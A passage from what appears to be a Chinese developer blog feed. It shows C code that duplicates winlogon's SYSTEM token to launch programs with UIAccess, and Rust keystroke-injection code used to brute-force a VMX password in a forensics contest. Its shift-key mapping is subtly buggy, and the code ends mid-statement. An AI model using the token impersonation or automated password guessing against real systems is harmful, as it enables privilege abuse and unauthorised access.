&#123;</span><br><span class="line">        HDROP hDrop = (HDROP)wParam;</span><br><span class="line">        UINT nFiles = DragQueryFile(hDrop, (UINT)<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nFiles &gt;= <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            TCHAR szFilePath[MAX_PATH];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取拖拽的文件的路径</span></span><br><span class="line">            <span class="keyword">if</span> (DragQueryFile(hDrop, <span class="number">0</span>, szFilePath, MAX_PATH) &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 将文件路径复制到IDC_EDIT_2中</span></span><br><span class="line">                HWND hEdit2 = GetDlgItem(hwnd, IDC_EDIT_2);</span><br><span class="line">                SetWindowText(hEdit2, szFilePath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        DragFinish(hDrop);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>uiaccess</title>
    <url>/2025/05/08/uiaccess/</url>
    <content><![CDATA[<p>参考<a href="https://blog.adeltax.com/window-z-order-in-windows-10/">Window z-order in Windows 10 – ADeltaX Blog</a>这篇文章，写了一个使用uiaccess权限启动<span style="text-decoration: line-through; color: gray;">任意</span>（并非任意）程序的脚本，可以实现窗口“超级置顶”</p>
<span id="more"></span>

<p>先上代码 uiaccess_tool.cpp，（创建一个控制台项目）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> DWORD <span class="title function_">DuplicateWinloginToken</span><span class="params">(DWORD dwSessionId, DWORD dwDesiredAccess, PHANDLE phToken)</span> &#123;</span><br><span class="line">    DWORD dwErr;</span><br><span class="line">    PRIVILEGE_SET ps;</span><br><span class="line"></span><br><span class="line">    ps.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    ps.Control = PRIVILEGE_SET_ALL_NECESSARY;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (LookupPrivilegeValue(<span class="literal">NULL</span>, SE_TCB_NAME, &amp;ps.Privilege[<span class="number">0</span>].Luid)) &#123;</span><br><span class="line">        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (INVALID_HANDLE_VALUE != hSnapshot) &#123;</span><br><span class="line">            BOOL bCont, bFound = FALSE;</span><br><span class="line">            PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">            pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line">            dwErr = ERROR_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (bCont = Process32First(hSnapshot, &amp;pe); bCont; bCont = Process32Next(hSnapshot, &amp;pe)) &#123;</span><br><span class="line">                HANDLE hProcess;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (_wcsicmp(pe.szExeFile, <span class="string">L&quot;winlogon.exe&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);</span><br><span class="line">                <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">                    HANDLE hToken;</span><br><span class="line">                    DWORD dwRetLen, sid;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hToken)) &#123;</span><br><span class="line">                        BOOL fTcb;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (PrivilegeCheck(hToken, &amp;ps, &amp;fTcb) &amp;&amp; fTcb) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (GetTokenInformation(hToken, TokenSessionId, &amp;sid, <span class="keyword">sizeof</span>(sid), &amp;dwRetLen) &amp;&amp; sid == dwSessionId) &#123;</span><br><span class="line">                                bFound = TRUE;</span><br><span class="line">                                <span class="keyword">if</span> (DuplicateTokenEx(hToken, dwDesiredAccess, <span class="literal">NULL</span>, SecurityImpersonation, TokenImpersonation, phToken)) &#123;</span><br><span class="line">                                    dwErr = ERROR_SUCCESS;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">else</span> &#123;</span><br><span class="line">                                    dwErr = GetLastError();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        CloseHandle(hToken);</span><br><span class="line">                    &#125;</span><br><span class="line">                    CloseHandle(hProcess);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bFound) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            CloseHandle(hSnapshot);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            dwErr = GetLastError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        dwErr = GetLastError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwErr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> DWORD <span class="title function_">CreateUIAccessToken</span><span class="params">(PHANDLE phToken)</span> &#123;</span><br><span class="line">    DWORD dwErr;</span><br><span class="line">    HANDLE hTokenSelf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE, &amp;hTokenSelf)) &#123;</span><br><span class="line">        DWORD dwSessionId, dwRetLen;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (GetTokenInformation(hTokenSelf, TokenSessionId, &amp;dwSessionId, <span class="keyword">sizeof</span>(dwSessionId), &amp;dwRetLen)) &#123;</span><br><span class="line">            HANDLE hTokenSystem;</span><br><span class="line"></span><br><span class="line">            dwErr = DuplicateWinloginToken(dwSessionId, TOKEN_IMPERSONATE, &amp;hTokenSystem);</span><br><span class="line">            <span class="keyword">if</span> (ERROR_SUCCESS == dwErr) &#123;</span><br><span class="line">                <span class="keyword">if</span> (SetThreadToken(<span class="literal">NULL</span>, hTokenSystem)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (DuplicateTokenEx(hTokenSelf, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT, <span class="literal">NULL</span>, SecurityAnonymous, TokenPrimary, phToken)) &#123;</span><br><span class="line">                        BOOL bUIAccess = TRUE;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!SetTokenInformation(*phToken, TokenUIAccess, &amp;bUIAccess, <span class="keyword">sizeof</span>(bUIAccess))) &#123;</span><br><span class="line">                            dwErr = GetLastError();</span><br><span class="line">                            CloseHandle(*phToken);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        dwErr = GetLastError();</span><br><span class="line">                    &#125;</span><br><span class="line">                    RevertToSelf();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dwErr = GetLastError();</span><br><span class="line">                &#125;</span><br><span class="line">                CloseHandle(hTokenSystem);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            dwErr = GetLastError();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        CloseHandle(hTokenSelf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        dwErr = GetLastError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwErr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">PrepareForUIAccessAndStartProcess</span><span class="params">(LPCWSTR lpApplicationName)</span> &#123;</span><br><span class="line">    DWORD dwErr;</span><br><span class="line">    HANDLE hTokenUIAccess;</span><br><span class="line"></span><br><span class="line">    dwErr = CreateUIAccessToken(&amp;hTokenUIAccess);</span><br><span class="line">    <span class="keyword">if</span> (ERROR_SUCCESS == dwErr) &#123;</span><br><span class="line">        STARTUPINFO si;</span><br><span class="line">        PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">        ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">        si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">        ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (CreateProcessAsUser(hTokenUIAccess, lpApplicationName, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line">            CloseHandle(pi.hProcess);</span><br><span class="line">            CloseHandle(pi.hThread);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            dwErr = GetLastError();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        CloseHandle(hTokenUIAccess);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwErr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">wWinMain</span><span class="params">(<span class="type">int</span> argc, <span class="type">wchar_t</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Usage: %s &lt;application_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD result = PrepareForUIAccessAndStartProcess(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (result == ERROR_SUCCESS) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Process started successfully with UI access.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to start process. Error: %lu\n&quot;</span>, result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>代码流程：</p>
<img src="/2025/05/08/uiaccess/PixPin_2025-05-08_16-43-14.png" alt="PixPin_2025-05-08_16-43-14" style="zoom:67%;">

<p>效果：现在有一个可以窗口置顶的demo（↓拍屏拍的）</p>
<p><img src="/2025/05/08/uiaccess/0efe7acf00a70add801732d90a263fce.jpg" alt="0efe7acf00a70add801732d90a263fce"></p>
<p>但是经过测试，比如使用tauri编写的程序，获取到uiaccess权限后无法正常运行，可能是因为tauri本身为了压缩体积，需要一些其他的依赖，比如Edge的一些东西（浏览器内核），所以这种程序可能启动失败，但是用普通的wpf，Python，rust的fltk等编写出来的程序运行起来没啥问题</p>
<br>
<br>
<br>
<br>



]]></content>
  </entry>
  <entry>
    <title>rust-prog</title>
    <url>/2025/05/09/rust-prog/</url>
    <content><![CDATA[<p><span style="font-size: 25px; font-weight: bold;">rust的几个练习小项目</span></p>
<span id="more"></span>
<h1 id="Virtual-Input"><a href="#Virtual-Input" class="headerlink" title="Virtual Input"></a>Virtual Input</h1><p>一个实现用来自动输入的脚本程序</p>
<p>修改main函数中的for循环部分，可以实现自定义自动输入</p>
<p>下面这个例子是用来暴力破解vmx的（2025盘古石晋级赛），规则是<code>Pgs?d?d?d?d3j</code>，中间是四位数字，使用for循环持续输入，效果如下：</p>
<p><img src="/2025/05/09/rust-prog/PixPin_2025-05-10_21-41-08.gif" alt="PixPin_2025-05-10_21-41-08"></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> winapi::um::winuser::&#123;INPUT, INPUT_KEYBOARD, KEYBDINPUT, SendInput, KEYEVENTF_KEYUP&#125;;</span><br><span class="line"><span class="keyword">use</span> std::collections::HashMap;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义虚拟键码</span></span><br><span class="line"><span class="keyword">const</span> VK_A: <span class="type">u16</span> = <span class="number">0x41</span>;</span><br><span class="line"><span class="keyword">const</span> VK_B: <span class="type">u16</span> = <span class="number">0x42</span>;</span><br><span class="line"><span class="keyword">const</span> VK_C: <span class="type">u16</span> = <span class="number">0x43</span>;</span><br><span class="line"><span class="keyword">const</span> VK_D: <span class="type">u16</span> = <span class="number">0x44</span>;</span><br><span class="line"><span class="keyword">const</span> VK_E: <span class="type">u16</span> = <span class="number">0x45</span>;</span><br><span class="line"><span class="keyword">const</span> VK_F: <span class="type">u16</span> = <span class="number">0x46</span>;</span><br><span class="line"><span class="keyword">const</span> VK_G: <span class="type">u16</span> = <span class="number">0x47</span>;</span><br><span class="line"><span class="keyword">const</span> VK_H: <span class="type">u16</span> = <span class="number">0x48</span>;</span><br><span class="line"><span class="keyword">const</span> VK_I: <span class="type">u16</span> = <span class="number">0x49</span>;</span><br><span class="line"><span class="keyword">const</span> VK_J: <span class="type">u16</span> = <span class="number">0x4A</span>;</span><br><span class="line"><span class="keyword">const</span> VK_K: <span class="type">u16</span> = <span class="number">0x4B</span>;</span><br><span class="line"><span class="keyword">const</span> VK_L: <span class="type">u16</span> = <span class="number">0x4C</span>;</span><br><span class="line"><span class="keyword">const</span> VK_M: <span class="type">u16</span> = <span class="number">0x4D</span>;</span><br><span class="line"><span class="keyword">const</span> VK_N: <span class="type">u16</span> = <span class="number">0x4E</span>;</span><br><span class="line"><span class="keyword">const</span> VK_O: <span class="type">u16</span> = <span class="number">0x4F</span>;</span><br><span class="line"><span class="keyword">const</span> VK_P: <span class="type">u16</span> = <span class="number">0x50</span>;</span><br><span class="line"><span class="keyword">const</span> VK_Q: <span class="type">u16</span> = <span class="number">0x51</span>;</span><br><span class="line"><span class="keyword">const</span> VK_R: <span class="type">u16</span> = <span class="number">0x52</span>;</span><br><span class="line"><span class="keyword">const</span> VK_S: <span class="type">u16</span> = <span class="number">0x53</span>;</span><br><span class="line"><span class="keyword">const</span> VK_T: <span class="type">u16</span> = <span class="number">0x54</span>;</span><br><span class="line"><span class="keyword">const</span> VK_U: <span class="type">u16</span> = <span class="number">0x55</span>;</span><br><span class="line"><span class="keyword">const</span> VK_V: <span class="type">u16</span> = <span class="number">0x56</span>;</span><br><span class="line"><span class="keyword">const</span> VK_W: <span class="type">u16</span> = <span class="number">0x57</span>;</span><br><span class="line"><span class="keyword">const</span> VK_X: <span class="type">u16</span> = <span class="number">0x58</span>;</span><br><span class="line"><span class="keyword">const</span> VK_Y: <span class="type">u16</span> = <span class="number">0x59</span>;</span><br><span class="line"><span class="keyword">const</span> VK_Z: <span class="type">u16</span> = <span class="number">0x5A</span>;</span><br><span class="line"><span class="keyword">const</span> VK_1: <span class="type">u16</span> = <span class="number">0x31</span>;</span><br><span class="line"><span class="keyword">const</span> VK_2: <span class="type">u16</span> = <span class="number">0x32</span>;</span><br><span class="line"><span class="keyword">const</span> VK_3: <span class="type">u16</span> = <span class="number">0x33</span>;</span><br><span class="line"><span class="keyword">const</span> VK_4: <span class="type">u16</span> = <span class="number">0x34</span>;</span><br><span class="line"><span class="keyword">const</span> VK_5: <span class="type">u16</span> = <span class="number">0x35</span>;</span><br><span class="line"><span class="keyword">const</span> VK_6: <span class="type">u16</span> = <span class="number">0x36</span>;</span><br><span class="line"><span class="keyword">const</span> VK_7: <span class="type">u16</span> = <span class="number">0x37</span>;</span><br><span class="line"><span class="keyword">const</span> VK_8: <span class="type">u16</span> = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">const</span> VK_9: <span class="type">u16</span> = <span class="number">0x39</span>;</span><br><span class="line"><span class="keyword">const</span> VK_0: <span class="type">u16</span> = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">const</span> VK_SPACE: <span class="type">u16</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">const</span> VK_RETURN: <span class="type">u16</span> = <span class="number">0x0D</span>;</span><br><span class="line"><span class="keyword">const</span> VK_TAB: <span class="type">u16</span> = <span class="number">0x09</span>;</span><br><span class="line"><span class="keyword">const</span> VK_SHIFT: <span class="type">u16</span> = <span class="number">0x10</span>;</span><br><span class="line"><span class="keyword">const</span> VK_BACK: <span class="type">u16</span> = <span class="number">0x08</span>;</span><br><span class="line"><span class="keyword">const</span> VK_CAPITAL: <span class="type">u16</span> = <span class="number">0x14</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义按下键的函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">press_key</span>(vk: <span class="type">u16</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span> = INPUT &#123;</span><br><span class="line">        type_: INPUT_KEYBOARD,</span><br><span class="line">        u: <span class="keyword">unsafe</span> &#123; std::mem::<span class="title function_ invoke__">zeroed</span>() &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        *input.u.<span class="title function_ invoke__">ki_mut</span>() = KEYBDINPUT &#123;</span><br><span class="line">            wVk: vk,</span><br><span class="line">            wScan: <span class="number">0</span>,</span><br><span class="line">            dwFlags: <span class="number">0</span>,</span><br><span class="line">            time: <span class="number">0</span>,</span><br><span class="line">            dwExtraInfo: <span class="number">0usize</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title function_ invoke__">SendInput</span>(<span class="number">1</span>, &amp;<span class="keyword">mut</span> input, std::mem::size_of::&lt;INPUT&gt;() <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义释放键的函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">release_key</span>(vk: <span class="type">u16</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span> = INPUT &#123;</span><br><span class="line">        type_: INPUT_KEYBOARD,</span><br><span class="line">        u: <span class="keyword">unsafe</span> &#123; std::mem::<span class="title function_ invoke__">zeroed</span>() &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        *input.u.<span class="title function_ invoke__">ki_mut</span>() = KEYBDINPUT &#123;</span><br><span class="line">            wVk: vk,</span><br><span class="line">            wScan: <span class="number">0</span>,</span><br><span class="line">            dwFlags: KEYEVENTF_KEYUP,</span><br><span class="line">            time: <span class="number">0</span>,</span><br><span class="line">            dwExtraInfo: <span class="number">0usize</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title function_ invoke__">SendInput</span>(<span class="number">1</span>, &amp;<span class="keyword">mut</span> input, std::mem::size_of::&lt;INPUT&gt;() <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义按下并释放按键的函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">send_key</span>(vk: <span class="type">u16</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">press_key</span>(vk);</span><br><span class="line">    <span class="title function_ invoke__">release_key</span>(vk);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义发送按键序列的函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">send_keys</span>(sequence: &amp;<span class="type">str</span>) &#123;</span><br><span class="line">    <span class="comment">// 字符到虚拟键码的映射表</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">key_map</span> = HashMap::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;a&#x27;</span>, VK_A);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;b&#x27;</span>, VK_B);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;c&#x27;</span>, VK_C);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;d&#x27;</span>, VK_D);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;e&#x27;</span>, VK_E);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;f&#x27;</span>, VK_F);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;g&#x27;</span>, VK_G);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;h&#x27;</span>, VK_H);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;i&#x27;</span>, VK_I);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;j&#x27;</span>, VK_J);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;k&#x27;</span>, VK_K);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;l&#x27;</span>, VK_L);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;m&#x27;</span>, VK_M);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;n&#x27;</span>, VK_N);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;o&#x27;</span>, VK_O);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;p&#x27;</span>, VK_P);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;q&#x27;</span>, VK_Q);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;r&#x27;</span>, VK_R);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;s&#x27;</span>, VK_S);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;t&#x27;</span>, VK_T);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;u&#x27;</span>, VK_U);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;v&#x27;</span>, VK_V);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;w&#x27;</span>, VK_W);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;x&#x27;</span>, VK_X);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;y&#x27;</span>, VK_Y);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;z&#x27;</span>, VK_Z);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;1&#x27;</span>, VK_1);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;2&#x27;</span>, VK_2);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;3&#x27;</span>, VK_3);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;4&#x27;</span>, VK_4);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;5&#x27;</span>, VK_5);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;6&#x27;</span>, VK_6);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;7&#x27;</span>, VK_7);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;8&#x27;</span>, VK_8);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;9&#x27;</span>, VK_9);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;0&#x27;</span>, VK_0);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27; &#x27;</span>, VK_SPACE);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;\n&#x27;</span>, VK_RETURN);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;\t&#x27;</span>, VK_TAB);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;\r&#x27;</span>, VK_RETURN);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;A&#x27;</span>, VK_SHIFT | VK_A);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;B&#x27;</span>, VK_SHIFT | VK_B);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;C&#x27;</span>, VK_SHIFT | VK_C);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;D&#x27;</span>, VK_SHIFT | VK_D);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;E&#x27;</span>, VK_SHIFT | VK_E);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;F&#x27;</span>, VK_SHIFT | VK_F);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;G&#x27;</span>, VK_SHIFT | VK_G);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;H&#x27;</span>, VK_SHIFT | VK_H);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;I&#x27;</span>, VK_SHIFT | VK_I);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;J&#x27;</span>, VK_SHIFT | VK_J);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;K&#x27;</span>, VK_SHIFT | VK_K);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;L&#x27;</span>, VK_SHIFT | VK_L);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;M&#x27;</span>, VK_SHIFT | VK_M);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;N&#x27;</span>, VK_SHIFT | VK_N);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;O&#x27;</span>, VK_SHIFT | VK_O);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;P&#x27;</span>, VK_SHIFT | VK_P);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;Q&#x27;</span>, VK_SHIFT | VK_Q);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;R&#x27;</span>, VK_SHIFT | VK_R);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;S&#x27;</span>, VK_SHIFT | VK_S);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;T&#x27;</span>, VK_SHIFT | VK_T);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;U&#x27;</span>, VK_SHIFT | VK_U);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;V&#x27;</span>, VK_SHIFT | VK_V);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;W&#x27;</span>, VK_SHIFT | VK_W);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;X&#x27;</span>, VK_SHIFT | VK_X);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;Y&#x27;</span>, VK_SHIFT | VK_Y);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;Z&#x27;</span>, VK_SHIFT | VK_Z);</span><br><span class="line">    key_map.<span class="title function_ invoke__">insert</span>(<span class="string">&#x27;\x08&#x27;</span>, VK_BACK);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> <span class="variable">ch</span> <span class="keyword">in</span> sequence.<span class="title function_ invoke__">chars</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(&amp;vk) = 